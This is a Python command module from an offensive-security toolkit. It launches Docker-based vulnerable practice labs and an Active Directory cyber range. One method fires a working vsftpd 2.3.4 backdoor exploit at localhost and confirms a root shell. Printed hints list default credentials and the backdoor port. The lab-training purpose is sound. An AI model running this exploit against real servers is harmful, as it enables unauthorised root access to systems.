"""Lab environment commands -- spin up vulnerable practice targets.

Provides on-demand CTF-style lab scenarios powered by Docker containers.
Operators can practice techniques against realistic targets without
risking production systems.
"""

from __future__ import annotations

import secrets
import socket
import subprocess
import time
from pathlib import Path

import cmd2

from cli.commands._base import LazyOwnCommandSet
from utils import (
    miscellaneous_category,
    print_error,
    print_msg,
    print_warn,
)

BASE_DIR = Path(__file__).resolve().parent.parent.parent
LAB_COMPOSE = BASE_DIR / "deploy" / "lab" / "docker-compose.yml"
RANGE_DIR = BASE_DIR / "deploy" / "range"

RANGE_PROFILES: dict[str, dict] = {
    "ad-mini": {
        "compose": "ad-mini/docker-compose.yml",
        "description": "Vulnerable mini Active Directory with fake users and background traffic",
        "topology": "dc (AD DS), ws01 (implant target), traffic-gen (fake logons); IPs assigned by Docker, resolved at start",
        "difficulty": "medium",
    },
}

LAB_SCENARIOS: dict[str, dict] = {
    "wordpress": {
        "image": "vulnerables/web-dvwa:latest",
        "ports": {"80/tcp": 8080},
        "description": "Damn Vulnerable Web Application -- OWASP Top 10 practice",
        "difficulty": "easy",
    },
    "ad-lab": {
        "image": "ghcr.io/semperis/lab-ad:latest",
        "ports": {"389/tcp": 389, "445/tcp": 445, "88/tcp": 88},
        "description": "Active Directory lab with domain controller and workstations",
        "difficulty": "medium",
    },
    "metasploitable": {
        "image": "tleemcjr/metasploitable2:latest",
        "ports": {"21/tcp": 2121, "22/tcp": 2222, "80/tcp": 8081, "445/tcp": 1445},
        "description": "Metasploitable2 -- deliberately vulnerable Linux VM",
        "difficulty": "easy",
    },
    "juice-shop": {
        "image": "bkimminich/juice-shop:latest",
        "ports": {"3000/tcp": 3000},
        "description": "OWASP Juice Shop -- modern vulnerable web application",
        "difficulty": "medium",
    },
    "tomcat": {
        "image": "vulhub/tomcat:8.0",
        "ports": {"8080/tcp": 8888},
        "description": "Apache Tomcat 8.0 -- CVE-2017-12615 and more",
        "difficulty": "medium",
    },
    "struts": {
        "image": "vulhub/struts2:2.3.32",
        "ports": {"8080/tcp": 9090},
        "description": "Apache Struts2 -- CVE-2017-5638 and more",
        "difficulty": "hard",
    },
}

REGISTRY_PREFIX = "lazyown-lab-"


class LabCommandSet(LazyOwnCommandSet):
    """Manage local CTF lab environments via Docker."""

    phase = "lab"
    category = "12. Miscellaneous"

    def _docker_available(self) -> bool:
        """Check if Docker is installed and the daemon is reachable."""
        try:
            result = subprocess.run(
                ["docker", "info"],
                capture_output=True,
                timeout=10,
                check=False,
            )
            return result.returncode == 0
        except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
            return False

    def _running_containers(self) -> list[str]:
        """Return list of running lab container names."""
        try:
            result = subprocess.run(
                ["docker", "ps", "--format", "{{.Names}}", "--filter", f"name={REGISTRY_PREFIX}"],
                capture_output=True,
                text=True,
                timeout=5,
                check=False,
            )
            return [line.strip() for line in result.stdout.splitlines() if line.strip()]
        except FileNotFoundError:
            return []

    def _container_name(self, scenario: str) -> str:
        """Return the container name for a given scenario."""
        return f"{REGISTRY_PREFIX}{scenario}"

    @cmd2.with_category(miscellaneous_category)
    def do_lab(self, line):
        """Manage local CTF practice labs.

        Usage:
            lab list                     — show available scenarios
            lab start <scenario>         — spin up a vulnerable target
            lab stop <scenario>          — tear down a running scenario
            lab status                   — show running labs
            lab range start <profile>    — start a cyber range (ad-mini)
            lab range stop <profile>     — stop a cyber range
            lab range status             — range container status
            lab range verify <profile>   — fire a real exploit to prove it works

        Examples:
            lab start metasploitable
            lab start wordpress
            lab list
            lab status
            lab stop metasploitable
            lab range start ad-mini

        Requires Docker. Lab containers are isolated and safe for practice.
        """
        args = line.strip().split()
        if not args:
            print_msg("Usage: lab [list|start|stop|status|range] [scenario]")
            print_msg("Try: lab list")
            return

        action = args[0].lower()
        scenario = args[1] if len(args) > 1 else ""

        if action == "range":
            self._range_dispatch(args[1:])
        elif action == "list":
            self._lab_list()
            self._range_list()
        elif action == "start":
            if not scenario:
                print_error("Specify a scenario. Try: lab list")
                return
            self._lab_start(scenario)
        elif action == "stop":
            if not scenario:
                print_error("Specify a scenario. Try: lab status")
                return
            self._lab_stop(scenario)
        elif action == "status":
            self._lab_status()
        else:
            print_error(f"Unknown action: {action}. Use list, start, stop, status, or range.")

    def _lab_list(self):
        """Display available lab scenarios."""
        print_msg("\nAvailable lab scenarios:\n")
        for name, info in LAB_SCENARIOS.items():
            difficulty = info.get("difficulty", "unknown")
            desc = info.get("description", "")
            ports = ", ".join(info.get("ports", {}).keys())
            print_msg(f"  {name:<20} [{difficulty:<8}] {desc}")
            print_msg(f"  {'':20}  ports: {ports}")
        print_msg("")
        print_msg("Use: lab start <scenario> to spin one up.")
        if not self._docker_available():
            print_warn("Docker not detected. Install Docker to use lab scenarios.")

    def _lab_start(self, scenario: str):
        """Spin up a lab scenario container."""
        if scenario not in LAB_SCENARIOS:
            print_error(f"Unknown scenario: {scenario}. Use 'lab list' to see options.")
            return

        if not self._docker_available():
            print_error("Docker is required to start lab scenarios.")
            print_error("Install: sudo apt install docker.io && sudo systemctl start docker")
            return

        info = LAB_SCENARIOS[scenario]
        image = info["image"]
        container_name = self._container_name(scenario)
        ports = info.get("ports", {})

        running = self._running_containers()
        if container_name in running:
            print_warn(f"Lab '{scenario}' is already running.")
            return

        print_msg(f"Pulling image {image} ...")
        subprocess.run(["docker", "pull", image], check=False)

        cmd = ["docker", "run", "-d", "--rm", "--name", container_name]
        for container_port, host_port in ports.items():
            cmd.extend(["-p", f"{host_port}:{container_port.split('/')[0]}"])
        cmd.append(image)

        print_msg(f"Starting lab: {scenario} ({info.get('description', '')})")
        result = subprocess.run(cmd, capture_output=True, text=True, check=False)

        if result.returncode == 0:
            container_id = result.stdout.strip()[:12]
            print_msg(f"Lab '{scenario}' started. Container: {container_id}")
            print_msg("Ports:")
            for container_port, host_port in ports.items():
                print_msg(f"  {host_port} -> {container_port}")

            if scenario == "metasploitable":
                print_msg("\n[*] Assign target: assign rhost 127.0.0.1")
                print_msg("[*] Quick start: assign rhost 127.0.0.1 && lazynmap")
            elif scenario in ("wordpress", "juice-shop", "tomcat", "struts"):
                port = list(ports.values())[0]
                print_msg(f"\n[*] Assign target: assign rhost 127.0.0.1 && assign url http://127.0.0.1:{port}")
                print_msg("[*] Quick start: ww && gobuster")
        else:
            print_error(f"Failed to start lab '{scenario}': {result.stderr}")

    def _lab_stop(self, scenario: str):
        """Stop a running lab scenario."""
        container_name = self._container_name(scenario)
        running = self._running_containers()

        if container_name not in running:
            print_warn(f"Lab '{scenario}' is not running.")
            return

        print_msg(f"Stopping lab: {scenario}")
        subprocess.run(
            ["docker", "stop", container_name],
            capture_output=True,
            timeout=15,
            check=False,
        )
        print_msg(f"Lab '{scenario}' stopped.")

    def _range_dispatch(self, args: list[str]) -> None:
        """Dispatch ``lab range`` subcommands.

        Args:
            args: Tokens after ``range`` (start|stop|status + profile).
        """
        if not args:
            print_msg("Usage: lab range [start|stop|status] [profile]")
            self._range_list()
            return
        action = args[0].lower()
        profile = args[1] if len(args) > 1 else ""
        if action == "start":
            if not profile:
                print_error("Specify a range profile. Try: lab range start ad-mini")
                return
            self._range_start(profile)
        elif action == "stop":
            if not profile:
                print_error("Specify a range profile.")
                return
            self._range_stop(profile)
        elif action == "status":
            self._range_status()
        elif action == "verify":
            if not profile:
                print_error("Specify a range profile. Try: lab range verify ad-mini")
                return
            self._range_verify(profile)
        else:
            print_error(f"Unknown range action: {action}")

    def _range_list(self) -> None:
        """Display available cyber range profiles."""
        print_msg("\nAvailable range profiles:\n")
        for name, info in RANGE_PROFILES.items():
            print_msg(f"  {name:<20} [{info.get('difficulty', ''):<8}] {info.get('description', '')}")
            print_msg(f"  {'':20}  topology: {info.get('topology', '')}")
        print_msg("")
        print_msg("Use: lab range start ad-mini")

    def _range_compose(self, profile: str) -> Path | None:
        """Resolve the compose file for a range profile.

        Args:
            profile: Range profile name.

        Returns:
            Compose file path, or None when unknown.
        """
        info = RANGE_PROFILES.get(profile)
        if not info:
            print_error(f"Unknown range profile: {profile}. Available: {list(RANGE_PROFILES)}")
            return None
        compose = RANGE_DIR / info["compose"]
        if not compose.exists():
            print_error(f"Missing compose file: {compose}")
            return None
        return compose

    def _range_start(self, profile: str) -> None:
        """Start a cyber range profile via Docker Compose.

        Args:
            profile: Range profile name.
        """
        if not self._docker_available():
            print_error("Docker is required to start ranges.")
            return
        compose = self._range_compose(profile)
        if compose is None:
            return
        admin_password = self._ensure_range_secret(compose.parent)
        if admin_password:
            print_msg(f"[*] Range Administrator password: {admin_password} (per-deployment, disposable)")
        print_msg(f"Starting range: {profile} ...")
        result = subprocess.run(["docker", "compose", "-f", str(compose), "up", "-d"], capture_output=True, text=True, check=False)
        if result.returncode != 0:
            print_error(f"Failed to start range '{profile}': {(result.stderr or result.stdout)[-1500:]}")
            return
        print_msg(f"Range '{profile}' started.")
        self._range_wait_healthy(compose)
        ws_ip = self._range_container_ip("lazyown-range-ws01")
        if ws_ip:
            print_msg(f"[*] Assign target: assign rhost {ws_ip}")
        else:
            print_msg("[*] Assign target: inspect ws01 with: docker inspect lazyown-range-ws01")
        print_msg("[*] From THIS host use 127.0.0.1 with mapped ports (internal IPs live inside the range net):")
        print_msg("    ssh -p 2222 -o HostKeyAlgorithms=+ssh-rsa -o StrictHostKeyChecking=no msfadmin@127.0.0.1  # pass: msfadmin")
        print_msg("    ftp 127.0.0.1 2121                        # vsftpd 2.3.4, backdoor shell on 6200")
        print_msg("    smbclient -L //127.0.0.1 -P 1445 -N")
        print_msg("    curl http://127.0.0.1:8081/")
        print_msg("[*] With the range IP use native ports: ssh msfadmin@<ws01-ip> (port 22, same legacy key option)")
        print_msg("[*] Practice: gym start first_implant && gym start lateral_ad")

    def _range_container_state(self, container: str) -> str:
        """Read a container's lifecycle state.

        Args:
            container: Container name to inspect.

        Returns:
            State string (``running``, ``restarting``, ...) or empty.
        """
        try:
            result = subprocess.run(
                ["docker", "inspect", "--format", "{{.State.Status}}", container],
                capture_output=True,
                text=True,
                timeout=15,
                check=False,
            )
        except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
            return ""
        if result.returncode != 0:
            return ""
        return result.stdout.strip()

    def _range_wait_healthy(self, compose: Path, timeout: int = 180) -> None:
        """Wait for range containers to run and probe host-side ports.

        Polls the DC and workstation states, then TCP-probes the published
        SSH and LDAP ports from this host so the operator knows the range
        is reachable before practicing.

        Args:
            compose: Compose file of the range profile (unused for probing,
                kept for future per-profile port tables).
            timeout: Maximum seconds to wait for ``running`` state.
        """
        _ = compose
        deadline = time.time() + timeout
        states: dict[str, str] = {}
        while time.time() < deadline:
            states = {
                "lazyown-range-dc": self._range_container_state("lazyown-range-dc"),
                "lazyown-range-ws01": self._range_container_state("lazyown-range-ws01"),
            }
            if all(state == "running" for state in states.values()):
                break
            time.sleep(5)
        for container, state in states.items():
            if state != "running":
                print_warn(f"{container} is '{state or 'missing'}', expected 'running'. See: docker logs {container}")
        for host, port, label in (("127.0.0.1", 2222, "ws01 ssh"), ("127.0.0.1", 389, "dc ldap")):
            if self._tcp_reachable(host, port):
                print_msg(f"[*] Reachable: {label} on {host}:{port}")
            else:
                print_warn(f"Unreachable: {label} on {host}:{port} (still provisioning? retry in 60s)")

    def _range_verify(self, profile: str) -> None:
        """Prove the range is exploitable by firing a real exploit.

        For ``ad-mini`` this triggers the vsftpd 2.3.4 backdoor on ws01
        from this host and checks the shell answers ``uid=0``. This is a
        proof-of-exploit, not a banner check.

        Args:
            profile: Range profile name.
        """
        if profile != "ad-mini":
            print_error(f"No verifier for profile: {profile}")
            return
        print_msg("[*] Firing vsftpd 2.3.4 backdoor against 127.0.0.1:2121 ...")
        try:
            with socket.create_connection(("127.0.0.1", 2121), timeout=10) as ftp:
                ftp.recv(1024)
                ftp.sendall(b"USER backdoor:)\r\n")
                ftp.recv(1024)
                ftp.sendall(b"PASS anything\r\n")
                time.sleep(2)
            time.sleep(2)
            with socket.create_connection(("127.0.0.1", 6200), timeout=10) as shell:
                shell.sendall(b"id\n")
                time.sleep(1)
                answer = shell.recv(4096).decode(errors="replace")
        except OSError as exc:
            print_error(f"Exploit failed (is the range up?): {exc}")
            return
        if "uid=0" in answer:
            print_msg(f"[*] Root shell confirmed on ws01: {answer.strip().splitlines()[0]}")
            print_msg("[*] Range is live and exploitable. Next: gym start first_implant")
        else:
            print_error(f"Shell answered unexpectedly: {answer.strip()[:200]}")

    @staticmethod
    def _tcp_reachable(host: str, port: int, timeout: float = 3.0) -> bool:
        """Probe one TCP port from this host.

        Args:
            host: Hostname or IP to probe.
            port: TCP port to probe.
            timeout: Connection timeout in seconds.

        Returns:
            True when the connection succeeds.
        """
        try:
            with socket.create_connection((host, port), timeout=timeout):
                return True
        except OSError:
            return False

    def _ensure_range_secret(self, profile_dir: Path) -> str:
        """Generate the DC admin secret file when missing.

        The Samba DC entrypoint reads the Administrator password from a
        Docker secret file. The secret is generated per deployment with a
        random value and never committed; ``secrets/`` is gitignored.

        Args:
            profile_dir: Range profile directory holding the compose file.

        Returns:
            The Administrator password string, or empty on failure.
        """
        secrets_dir = profile_dir / "secrets"
        secret_file = secrets_dir / "samba-admin-password.txt"
        try:
            if secret_file.exists():
                return secret_file.read_text(encoding="utf-8").strip()
            secrets_dir.mkdir(parents=True, exist_ok=True)
            password = f"Range-{secrets.token_urlsafe(12)}!"
            secret_file.write_text(password, encoding="utf-8")
            try:
                secret_file.chmod(0o600)
            except OSError:
                pass
            return password
        except OSError as exc:
            print_warn(f"Could not prepare range secret: {exc}")
            return ""

    def _range_container_ip(self, container: str) -> str:
        """Resolve a range container's IP on its compose network.

        Args:
            container: Container name to inspect.

        Returns:
            IPv4 address string, or empty when unavailable.
        """
        try:
            result = subprocess.run(
                ["docker", "inspect", "--format", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}", container],
                capture_output=True,
                text=True,
                timeout=15,
                check=False,
            )
        except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
            return ""
        if result.returncode != 0:
            return ""
        return result.stdout.strip()

    def _range_stop(self, profile: str) -> None:
        """Stop a cyber range profile.

        Args:
            profile: Range profile name.
        """
        compose = self._range_compose(profile)
        if compose is None:
            return
        print_msg(f"Stopping range: {profile}")
        result = subprocess.run(["docker", "compose", "-f", str(compose), "down", "-v"], capture_output=True, text=True, check=False)
        if result.returncode != 0:
            print_error(f"Failed to stop range '{profile}': {(result.stderr or result.stdout)[-1500:]}")
            return
        print_msg(f"Range '{profile}' stopped.")

    def _range_status(self) -> None:
        """Show range container status."""
        running = self._running_containers()
        ranged = [c for c in running if "range" in c]
        if not ranged:
            print_msg("No ranges running. Use: lab range start ad-mini")
            return
        print_msg("\nRunning ranges:\n")
        for container_name in ranged:
            print_msg(f"  {container_name}")
        print_msg("")

    def _lab_status(self):
        """Show currently running lab containers."""
        if not self._docker_available():
            print_error("Docker is required to check lab status.")
            return

        running = self._running_containers()
        if not running:
            print_msg("No labs running.")
            print_msg("Use: lab list && lab start <scenario>")
            return

        print_msg("\nRunning labs:\n")
        for container_name in running:
            scenario = container_name.replace(REGISTRY_PREFIX, "")
            info = LAB_SCENARIOS.get(scenario, {})
            ports = info.get("ports", {})

            result = subprocess.run(
                ["docker", "inspect", "--format", "{{.State.Status}}", container_name],
                capture_output=True,
                text=True,
                timeout=5,
                check=False,
            )
            status = result.stdout.strip() if result.returncode == 0 else "unknown"

            print_msg(f"  {scenario:<20} [{status}] {info.get('description', '')}")
            if ports:
                for container_port, host_port in ports.items():
                    print_msg(f"  {'':20}  {host_port} -> {container_port}")
        print_msg("")
        print_msg("Use: lab stop <scenario> to tear one down.")
